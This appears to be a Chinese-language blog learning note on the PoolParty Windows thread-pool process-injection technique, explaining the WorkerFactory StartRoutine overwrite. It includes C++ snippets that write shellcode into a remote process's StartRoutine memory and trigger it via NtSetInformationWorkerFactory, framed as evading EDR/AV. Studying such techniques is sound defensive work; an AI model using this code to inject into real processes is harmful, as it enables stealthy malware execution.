---
title: PoolParty Injection Learning Note
date: 2025-05-21
categories: [security, injection]
tags: [security, injection]
---

记录学习Poolparty注入技术的笔记 - 2025-5-21

poolparty，一种只需要在远程线程中分配和写入操作，而无需执行操作的注入技术，其核心是利用了windows的线程池作为攻击对象
由于其并没有直接执行shellcode，所以大部分edr/av无法检测（当时，现在就不一定了）

[SafeBreach原文地址](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/)

## 第一种注入技术 **复写workerfactory Startroutine**

WorkerFactory是Windows用于高效维护线程池的核心组件，它本身并不直接执行线程，而是负责管理和调度线程池中的工作线程。

WorkerFactory结构体中包含了`WorkerFactoryBasicInformation`信息，其中最关键的是StartRoutine字段，换言之，我们只需要控制StartRoutine就可以执行我们的代码。

### 为什么不能新建WorkerFactory？

此时我就想到能不能在进程中新建一个WorkerFactory且将其中的Startroutine指向我们的恶意代码。
但随着逆向深入，我发现在Windows内核(ntoskrnl.exe)中，`NtCreateWorkerFactory`函数有一个关键的检查机制。

```c++
__int64 __fastcall NtCreateWorkerFactory(
        _QWORD *a1,
        unsigned int a2,
        __int64 a3,
        void *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        int a8,
        __int64 a9,
        __int64 a10)
{
  KPROCESSOR_MODE PreviousMode;
  NTSTATUS v17;
  PVOID v19;
  PVOID v29;
  
  // 获取当前线程的Previous Mode
  PreviousMode = KeGetCurrentThread()->PreviousMode;
  
  // 通过进程句柄获取进程对象引用
  v17 = ObpReferenceObjectByHandleWithTag(a5, 42, PsProcessType, PreviousMode, 1717008453, &v29, 0, 0);
  if (v17 < 0)
    return v17;
    
  v19 = v29;
  
  // 关键检查：验证调用者是否为目标进程中的线程
  if (KeGetCurrentThread()->ApcState.Process != v29) {
    v17 = STATUS_ACCESS_DENIED;  // 返回拒绝访问错误
    ObfDereferenceObjectWithTag(v19, 0x66577845u);
    return v17;
  }
  
  // 如果检查通过，继续创建WorkerFactory对象
  // ... 其余创建逻辑 ...
  
  return result;
}
```

**关键机制分析：**

在函数中的这行代码是核心检查：
```c++
if (KeGetCurrentThread()->ApcState.Process != v29)
```

- `KeGetCurrentThread()->ApcState.Process`：获取当前执行线程所属的进程
- `v29`：通过传入进程句柄解析得到的目标进程对象
- 如果两者不匹配，说明调用者试图跨进程创建WorkerFactory，这是不被允许的

这个检查确保了只有进程内部的线程才能为该进程创建WorkerFactory。**如果调用者不是目标进程中的线程，创建操作将返回`STATUS_ACCESS_DENIED`失败。**

### 为什么不能修改Startroutine指针？

而且直接将StartRoutine指向我们的shellcode是不现实的，因为在WorkerFactory创建时StartRoutine的值是常量，不可更改。

既然不可用新建新的WorkerFactory，且StartRoutine是一个指针，那么我们可以换个思路：**不修改指针本身，而是修改指针指向的内存内容**。我们可以向StartRoutine指向的内存空间写入我们的shellcode，这样当系统调用该函数时，实际执行的就是我们的恶意代码。

### 如何获取 StartRoutine 指针？

通过Windows内核API `NtQueryInformationWorkerFactory` 函数，我们可以获取当前WorkerFactory的详细信息：

```c++
// NtQueryInformationWorkerFactory 函数
typedef NTSTATUS(NTAPI* NtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    WORKER_FACTORY_INFORMATION_CLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,     //关键字段：WorkerFactoryInformation
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
);

// WorkerFactory Basic Information 结构体
typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;             
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN       Paused;
    BOOLEAN       TimerSet;
    BOOLEAN       QueuedToExWorker;
    BOOLEAN       MayCreate;
    BOOLEAN       CreateInProgress;
    BOOLEAN       InsertedIntoQueue;
    BOOLEAN       Shutdown;            
    ULONG         BindingCount;
    ULONG         ThreadMinimum;
    ULONG         ThreadMaximum;
    ULONG         PendingWorkerCount;
    ULONG         WaitingWorkerCount;
    ULONG         TotalWorkerCount;
    ULONG         ReleaseCount;
    LONGLONG      InfiniteWaitGoal;
    PVOID         StartRoutine;        // 关键字段：线程入口点指针
    PVOID         StartParameter;
    HANDLE        ProcessId;            
    SIZE_T        StackReserve;       
    SIZE_T        StackCommit;         
    NTSTATUS      LastThreadCreationStatus; 
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;
```

在`WORKER_FACTORY_BASIC_INFORMATION`结构体中，`StartRoutine`字段就是我们需要的指针值。

获取到StartRoutine指针后，我们就可以直接覆写该指针指向的内存空间，将我们的shellcode写入其中。当Windows线程池机制触发时，系统会自动执行我们植入的恶意代码。

示例代码：

```c++
bool overwriteStartRoutine() {
    std::cout << "[*] Overwriting StartRoutine at " << info.StartRoutine << std::endl;
    DWORD old;
    if (!VirtualProtectEx(
        hProcess,
        info.StartRoutine,
        shellcode_.size(),
        PAGE_EXECUTE_READWRITE,
        &old
    )) {
        std::cerr << "[!] VirtualProtectEx failed: " << GetLastError() << std::endl;
        return false;
    }
    if (!WriteProcessMemory(
        hProcess,
        info.StartRoutine,
        shellcode.data(),
        shellcode.size(),
        nullptr
    )) {
        std::cerr << "[!] WriteProcessMemory failed: " << GetLastError() << std::endl;
        return false;
    }
    VirtualProtectEx(
        hProcess_, info.StartRoutine, shellcode_.size(), old, &old
    );

    return true;
}
```

### 如何在更改后立即执行？

我们已经成功将shellcode写入了StartRoutine指向的内存，但此时shellcode并不会立即执行。这是因为我们只是替换了函数内容，而线程池系统并不知道需要创建新的工作线程来执行它。

为了触发shellcode的立即执行，Windows内核提供了 `NtSetInformationWorkerFactory` API：

```c++
// NtSetInformationWorkerFactory 函数
typedef NTSTATUS(NTAPI* NtSetInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    WORKER_FACTORY_INFORMATION_CLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
);

// WorkerFactory 信息类枚举
enum WORKER_FACTORY_INFORMATION_CLASS {
    WorkerFactoryTimeout = 0,
    WorkerFactoryRetryTimeout = 1,
    WorkerFactoryIdleTimeout = 2,
    WorkerFactoryBindingCount = 3,
    WorkerFactoryThreadMinimum = 4,  // 关键字段：最小线程数
    WorkerFactoryThreadMaximum = 5,
    WorkerFactoryPaused = 6,
    WorkerFactoryBasicInformation = 7
};
```

**立即执行的核心原理：**

通过修改`WorkerFactoryThreadMinimum`字段来强制线程池创建新的工作线程：

1. **获取当前线程数**：首先查询WorkerFactory当前的线程状态
2. **增加最小线程数**：将ThreadMinimum设置为当前线程数+1
3. **触发线程创建**：系统检测到最小线程数不足，会立即创建新的工作线程
4. **执行shellcode**：新创建的线程会调用被我们替换的StartRoutine，从而执行shellcode

示例代码：

```c++
bool triggerExecution() {
    ULONG newMin = info.TotalWorkerCount + 1;
    NTSTATUS st = NtSetInformationWorkerFactory(
        hFactory_, WorkerFactoryThreadMinimum,
        &newMin, sizeof(newMin)
    );
    if (!NT_SUCCESS(st)) {
        std::cerr << "[!] NtSetInformationWorkerFactory failed: 0x"
            << std::hex << st << std::dec << std::endl;
        return false;
    }
    std::cout << "[*] Triggered WorkerFactory thread creation." << std::endl;
    return true;
}
```

这种方法的优势在于**无需等待自然的线程池调度**，而是主动触发新线程的创建，确保我们的shellcode能够立即得到执行。

### 结语

**执行流程：**

1. OpenProcess 
2. DuplicateHandle
3. NtQueryInformationWorkerFactory
4. WriteProcessMemory
5. NtSetInformationWorkerFactory

至此，我们完成了第一种PoolParty注入技术：通过覆写WorkerFactory的StartRoutine并主动触发新线程创建来实现代码注入。

> 持续更新中....